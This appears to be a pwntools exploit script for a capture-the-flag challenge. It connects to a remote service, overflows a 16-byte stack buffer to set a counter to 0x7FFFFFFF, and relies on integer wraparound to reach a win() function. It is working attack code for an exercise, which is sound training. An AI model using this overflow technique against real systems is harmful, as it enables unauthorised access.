from pwn import *

host = "10.213.0.102"
port = "53713"  # Update with your port
context.log_level = 'info'
context.arch = 'i386'

p = remote(host, port)

# Wait for prompt
p.recvuntil(b"Let's count to the infinity")

# Stack layout:
# local_20 [16 bytes] - our input buffer
# (padding if any for alignment)
# local_10 [4 bytes] - the counter we want to overflow

# We want to set local_10 = 0x7FFFFFFF (2147483647)
# So when it increments: 0x7FFFFFFF + 1 = 0x80000000 (-2147483648, negative!)

# Build payload
payload = b"A" * 16                    # Fill local_20 (16 bytes)
payload += p32(0x7FFFFFFF)             # Overwrite local_10 with max int

print(f"Payload length: {len(payload)}")
print(f"Payload: {payload}")

p.sendline(payload)

# The program will increment local_10:
# 0x7FFFFFFF + 1 = 0x80000000 (which is negative in signed int)
# This triggers: if (local_10 < 0) { win(); }

# Get the flag
p.interactive()